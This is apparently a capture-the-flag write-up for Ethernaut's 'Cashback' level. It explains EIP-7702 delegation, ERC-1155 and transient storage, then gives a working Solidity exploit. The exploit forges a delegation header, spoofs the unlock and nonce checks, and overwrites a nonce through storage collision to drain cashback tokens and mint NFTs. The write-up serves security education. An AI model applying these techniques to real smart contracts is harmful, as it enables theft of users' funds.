# Ethernaut Level 36 Cashback

---

Contract:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "openzeppelin-contracts-v5.4.0/token/ERC20/IERC20.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";
import {ERC1155} from "openzeppelin-contracts-v5.4.0/token/ERC1155/ERC1155.sol";
import {TransientSlot} from "openzeppelin-contracts-v5.4.0/utils/TransientSlot.sol";

/*//////////////////////////////////////////////////////////////
                        CURRENCY LIBRARY
//////////////////////////////////////////////////////////////*/

type Currency is address;

using {equals as ==} for Currency global;
using CurrencyLibrary for Currency global;

function equals(Currency currency, Currency other) pure returns (bool) {
    return Currency.unwrap(currency) == Currency.unwrap(other);
}

library CurrencyLibrary {
    error NativeTransferFailed();
    error ERC20IsNotAContract();
    error ERC20TransferFailed();

    Currency public constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    function isNative(Currency currency) internal pure returns (bool) {
        return Currency.unwrap(currency) == Currency.unwrap(NATIVE_CURRENCY);
    }

    function transfer(Currency currency, address to, uint256 amount) internal {
        if (currency.isNative()) {
            (bool success,) = to.call{value: amount}("");
            require(success, NativeTransferFailed());
        } else {
            (bool success, bytes memory data) = Currency.unwrap(currency).call(abi.encodeCall(IERC20.transfer, (to, amount)));
            require(Currency.unwrap(currency).code.length != 0, ERC20IsNotAContract());
            require(success, ERC20TransferFailed());
            require(data.length == 0 || true == abi.decode(data, (bool)), ERC20TransferFailed());
        }
    }

    function toId(Currency currency) internal pure returns (uint256) {
        return uint160(Currency.unwrap(currency));
    }
}

/*//////////////////////////////////////////////////////////////
                       CASHBACK CONTRACT
//////////////////////////////////////////////////////////////*/

/// @dev keccak256(abi.encode(uint256(keccak256("Cashback")) - 1)) & ~bytes32(uint256(0xff))
contract Cashback is ERC1155 layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba00 {
    using TransientSlot for *;

    error CashbackNotCashback();
    error CashbackIsCashback();
    error CashbackNotAllowedInCashback();
    error CashbackOnlyAllowedInCashback();
    error CashbackNotDelegatedToCashback();
    error CashbackNotEOA();
    error CashbackNotUnlocked();
    error CashbackSuperCashbackNFTMintFailed();

    bytes32 internal constant UNLOCKED_TRANSIENT = keccak256("cashback.storage.Unlocked");
    uint256 internal constant BASIS_POINTS = 10000;
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    Cashback internal immutable CASHBACK_ACCOUNT = this;
    address public immutable superCashbackNFT;

    uint256 public nonce;
    mapping(Currency => uint256 Rate) public cashbackRates;
    mapping(Currency => uint256 MaxCashback) public maxCashback;

    modifier onlyCashback() {
        require(msg.sender == address(CASHBACK_ACCOUNT), CashbackNotCashback());
        _;
    }

    modifier onlyNotCashback() {
        require(msg.sender != address(CASHBACK_ACCOUNT), CashbackIsCashback());
        _;
    }

    modifier notOnCashback() {
        require(address(this) != address(CASHBACK_ACCOUNT), CashbackNotAllowedInCashback());
        _;
    }

    modifier onlyOnCashback() {
        require(address(this) == address(CASHBACK_ACCOUNT), CashbackOnlyAllowedInCashback());
        _;
    }

    modifier onlyDelegatedToCashback() {
        bytes memory code = msg.sender.code;

        address payable delegate;
        assembly {
            delegate := mload(add(code, 0x17))
        }
        require(Cashback(delegate) == CASHBACK_ACCOUNT, CashbackNotDelegatedToCashback());
        _;
    }

    modifier onlyEOA() {
        require(msg.sender == tx.origin, CashbackNotEOA());
        _;
    }

    modifier unlock() {
        UNLOCKED_TRANSIENT.asBoolean().tstore(true);
        _;
        UNLOCKED_TRANSIENT.asBoolean().tstore(false);
    }

    modifier onlyUnlocked() {
        require(Cashback(payable(msg.sender)).isUnlocked(), CashbackNotUnlocked());
        _;
    }

    receive() external payable onlyNotCashback {}

    constructor(
        address[] memory cashbackCurrencies,
        uint256[] memory currenciesCashbackRates,
        uint256[] memory currenciesMaxCashback,
        address _superCashbackNFT
    ) ERC1155("") {
        uint256 len = cashbackCurrencies.length;
        for (uint256 i = 0; i < len; i++) {
            cashbackRates[Currency.wrap(cashbackCurrencies[i])] = currenciesCashbackRates[i];
            maxCashback[Currency.wrap(cashbackCurrencies[i])] = currenciesMaxCashback[i];
        }

        superCashbackNFT = _superCashbackNFT;
    }

    // Implementation Functions
    function accrueCashback(Currency currency, uint256 amount) external onlyDelegatedToCashback onlyUnlocked onlyOnCashback{
        uint256 newNonce = Cashback(payable(msg.sender)).consumeNonce();
        uint256 cashback = (amount * cashbackRates[currency]) / BASIS_POINTS;

        if (cashback != 0) {
            uint256 _maxCashback = maxCashback[currency];
            if (balanceOf(msg.sender, currency.toId()) + cashback > _maxCashback) {
                cashback = _maxCashback - balanceOf(msg.sender, currency.toId());
            }

            uint256[] memory ids = new uint256[](1);
            ids[0] = currency.toId();
            uint256[] memory values = new uint256[](1);
            values[0] = cashback;
            _update(address(0), msg.sender, ids, values);
        }
        if (SUPERCASHBACK_NONCE == newNonce) {
            (bool success,) = superCashbackNFT.call(abi.encodeWithSignature("mint(address)", msg.sender));
            require(success, CashbackSuperCashbackNFTMintFailed());
        }
    }

    // Smart Account Functions
    function payWithCashback(Currency currency, address receiver, uint256 amount) external unlock onlyEOA notOnCashback {
        currency.transfer(receiver, amount);
        CASHBACK_ACCOUNT.accrueCashback(currency, amount);
    }

    function consumeNonce() external onlyCashback notOnCashback returns (uint256) {
        return ++nonce;
    }

    function isUnlocked() public view returns (bool) {
        return UNLOCKED_TRANSIENT.asBoolean().tload();
    }
}
```

Our winning conditions can be referred from the code snippets here:

```solidity
function validateInstance(address payable _instance, address _player) public view override returns (bool) {
        bytes23 expectedCode = bytes23(bytes.concat(hex"ef0100", abi.encodePacked(_instance)));

        return Cashback(_instance).balanceOf(_player, Currency.wrap(NATIVE_CURRENCY).toId()) == NATIVE_MAX_CASHBACK
            && Cashback(_instance).balanceOf(_player, Currency.wrap(address(FREE)).toId()) == FREE_MAX_CASHBACK
            && ERC721(Cashback(_instance).superCashbackNFT()).ownerOf(uint256(uint160(_player))) == _player
            && ERC721(Cashback(_instance).superCashbackNFT()).balanceOf(_player) >= 2 && _player.code.length == 23
            && bytes23(_player.code) == expectedCode;
    }
```

This code is from the Ethernaut source code [CashbackFactory.sol](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/levels/CashbackFactory.sol). Here, we can see that we have to satisfy:

1. The player's native token balance equals `NATIVE_MAX_CASHBACK`.
2. The player's free token balance equals `FREE_MAX_CASHBACK`.
3. The player's super cashback NFT balance greater than or equals 2 and one of the NFT has the token id of the player's address.
4. The code from player should be like "0xef0100" + instance address (23 bytes in total).

To actually understand what is this Cashback contract doing, we need some background knowledge of `EIP-7702`, `ERC-1155`, and some other features of this contract.

## EIP-7702

It is weird to refer to "player's code" in condition 4 since EOA is not supposed to have any code in the address. However, it is only true before `EIP-7702`. And after the newly released `EIP-7702` upgrade, user can actually have a code like this: `"0xef0100" + impl address (23 bytes in total)` under their EOA address by signing delegation to an implementation address **`vm.signAndAttachDelegation(address, publicKey)`**. By doing that, EOA can act as a *smart account* and use ABIs from the implementation and persist a storage of its own.

There are a bunch of benefits about 7702 upgrade. With 7702, an EOA gets many of the benefits of smart-contract wallets without needing to deploy one. And batching transactions (approve + spend in one go), paying gas in non-ETH tokens, delegated approvals/key-recovery, more flexible wallet logic are possible now. More info can be found [from official documentation](https://eips.ethereum.org/EIPS/eip-7702). Also, [this blog](https://piatoss3612.tistory.com/203) and [this video from Patrick Collins](https://www.youtube.com/watch?v=0uy4nd8vIe8) takes a deeper dive into the authorization protocol and type 4 transactions in `EIP-7702`.

## ERC-1155

`ERC-1155` is meant to be used for a multi-token standard that combines fungible and non-fungible tokens in a single contract. So now one contract can manage many types of different tokens, which, without `ERC-1155`, require a contract for each of them. More info from [here](https://ethereum.org/developers/docs/standards/tokens/erc-1155/).

## Transient Storage

This is another feature we found here `using TransientSlot for *;` inside the `Cashback` contract. Transient storage is a new EVM-data-location that acts like storage (key-value, 32-byte slots) but **only lives for the duration of a single transaction**. After the transaction finishes (all calls return), the data is automatically cleared. It introduces two new opcodes: TSTORE (store to transient slot) and TLOAD (load from transient slot). It is scoped per contract (not globally shared between unrelated contracts) unless delegate-call is used. Transient storage fills the gap between memory (cleared at end of call) and storage (persists across transactions). It lets you hold state across *calls within a transaction* (including external contract calls) without writing to persistent storage.

Typically it is a security protocol to avoid persistent storage of the contract. 

## Contract analysis

Now we can continue to make a sound analysis for this contract. There are many modifiers in the `Cashback` contract, and based on its scale and functionality, we can divide them into 3 categories: context modifiers (`notOnCashback`, `onlyOnCashback`), caller modifiers (`onlyCashback`, `onlyNotCashback`, `onlyEOA`, `onlyDelegatedToCashback`), and T-store related modifiers (`unlock`, `onlyUnlocked`).

### context modifiers:

These modifiers use `address(this)` as the judging criteria, which is quite confusing since intuitively `address(this)` should always equal to `address(CASHBACK_ACCOUNT)`. However, it is not the case if some other proxies *delegate call* this contract, since the *context* would be the proxies'. This contract can be a target of a delegate call and a normal call at the same time. So we have to use context modifiers to make sure on which context we are calling these functions.

### caller modifiers:

We also use `msg.sender` to define who can call this function. For example, in function `function consumeNonce() external onlyCashback notOnCashback returns (uint256)`, we have a `onlyCashback` here since we don't want anyone call this function to modify the nonce except for the `Cashback` itself. The most complex one is `onlyDelegatedToCashback`:

```solidity
modifier onlyDelegatedToCashback() {
        bytes memory code = msg.sender.code;

        address payable delegate;
        assembly {
            delegate := mload(add(code, 0x17))
        }
        require(Cashback(delegate) == CASHBACK_ACCOUNT, CashbackNotDelegatedToCashback());
        _;
    }
```

We can see that it checks somewhere in the `msg.sender.code` in the inline assembly. Note that when a `bytes` data gets loaded into the memory, it starts with a 32-byte header, which contains the length of the data, and then begins with the actual data itself. So in offset `0x17`(starts at the beginning of the header), we use `mload` to load a 32-byte slot, where the last 20 bytes contains the address. 

So the `msg.sender.code` *can* be something like this: `"0xef0100" + impl address (23 bytes in total)` in correspondence with `EIP-7702`. In this scenario, EOA delegates to `Cashback` contract and call its function.

### other modifiers

We use other modifiers `unlock` and `onlyUnlocked` to enable and disable the transient storage and check whether it is locked or not.



So a common usage of this contract should be like this: 

1. Users use their EOA to sign the delegate to the contract instance, then call `payWithCashback` function. It unlocks the transient storage and this function called by EOA (`onlyEOA`) and in the context of EOA (`notOnCashback`).
2. Then inside function `payWithCashback`, the instance first transfer the certain amount of token, and then use `CASHBACK_ACCOUNT.accrueCashback`. The `msg.sender` here is still EOA, but the context has been switched to `Cashback` since it is from the `CASHBACK_ACCOUNT` and we need to access instance's storage to calculate cashback.
3. During `accrueCashback`, the instance changes nonce in the context of EOA (`function consumeNonce() external onlyCashback notOnCashback`). So when the EOA hits a nonce of 10000,  it can get an NFT minted. EOA cannot modify its own nonce by calling `consumeNonce()` since it is `onlyCashback`. 

## Attack Strategy

This contract seems impeccable, especially with the advanced access control with multiple modifiers. However, if we take a closer look at this contract, we can find three **fundamental** vulnerabilities:

1. Storage collision & overlapping. Even though the transient storage makes storage disappear every transaction done, the EOA's storage still persists. And the nonce counting mechanism of this contract depends on the *EOA's storage*, which means that we can find a way to modify our own storage to forge a fake nonce.

2. Bad delegation check. In modifier `onlyDelegatedToCashback`, the `EIP-7702` delegation check is very logically untenable. It only checks from the 4th byte to the 23rd byte (where the address lies) without checking the 3-byte header. We can forge a bytecode header with a *jump* opcode in the first 3 bytes and jump over the next 20 bytes so that we make the contract think that we are delegated to it, but actually we are not, with our malicious logic after  the 23-byte bytecode.
3. Put too much trust on the `msg.sender`. In function `accrueCashback`, we check the `isUnlocked()` result on the context of `msg.sender`. The `msg.sender` can have a malicious logic where every time `isUnlocked()` is going to return true.

So based on the winning condition, we can use a two-phase attacking strategy here:

1. **Phase one**: We write a `CashbackAttack` contract where it has an `attack` function, a `isUnlocked` function and a `consumeNonce` function. We will compile it into bytecode, and add a 23-byte header to it to get through the modifier. Then we manually deploy the tampered bytecode. Inside `attack` function we directly call `accrueCashback` function, with a maliciously tampered `isUnlocked` function and `consumeNonce` function, we can pass all three modifiers and directly print an NFT. We can transfer all cash backs to our EOA.
2. **Phase two**: Now we have enough amount of cash backs but we still don't have an NFT with player's account on it, since the NFT's token id is the `msg.sender` (in phase one that is the deployed attack contract). So we have to actually delegate to the instance from our EOA once. So we first delegate to a nonce setting contract, where we modify the EOA's nonce storage to 9999. Then we delegate to the `Cashback` instance and call `payWithCashback` to acquire the NFT with player's token id and a *valid* 23-byte code.

`CashbackAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "openzeppelin-contracts-v5.4.0/token/ERC20/IERC20.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";
import {Currency, Cashback} from "src/levels/Cashback.sol";

contract CashbackAttack {
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    uint256 internal constant NATIVE_AMOUNT = 200000000000000000000;
    uint256 internal constant FREEDOM_COIN_AMOUNT = 25000000000000000000000;
    uint256 constant NATIVE_MAX_CASHBACK = 1 ether;
    uint256 constant FREE_MAX_CASHBACK = 500 ether;

    Currency public constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    bool nonceOnce;

    function attack(Cashback cashbackContract, IERC20 freedomCoin, IERC721 superCashbackNFT, address recovery)
        external
    {
        Currency freedomCoinCurrency = Currency.wrap(address(freedomCoin));

        // Get max cashback on both currencies
        cashbackContract.accrueCashback(NATIVE_CURRENCY, NATIVE_AMOUNT);
        cashbackContract.accrueCashback(freedomCoinCurrency, FREEDOM_COIN_AMOUNT);

        // Transfer balances to the recovery address
        cashbackContract.safeTransferFrom(address(this), recovery, NATIVE_CURRENCY.toId(), NATIVE_MAX_CASHBACK, "");
        cashbackContract.safeTransferFrom(address(this), recovery, freedomCoinCurrency.toId(), FREE_MAX_CASHBACK, "");

        // Transfer Super Cashback NFT to the recovery address
        superCashbackNFT.transferFrom(address(this), recovery, uint256(uint160(address(this))));
    }

    function isUnlocked() public pure returns (bool) {
        return true;
    }

    function consumeNonce() external returns (uint256) {
        if (!nonceOnce) {
            nonceOnce = true;
            return SUPERCASHBACK_NONCE;
        }
        return 0;
    }
}

contract CashbackAttackNonceSetter layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03 {
    uint256 public nonce;

    function setNonce(uint256 newNonce) external {
        nonce = newNonce;
    }
}

contract CashbackAttackBytecodeDeployer {
    function deployFromBytecode(bytes memory bytecode) public returns (address) {
        address child;
        assembly {
            child := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        return child;
    }
}
```

One thing we **must** notice is that after the 23-byte header (phase one), the `CashbackAttack` bytecode should have all the operands of **jump** opcodes to plus an offset of `0x18` (with an extra **jumpdest** opcode on the 24th byte after the 23-byte header before the rest of the logic). So we must **disassemble** the original `CashbackAttack` bytecode.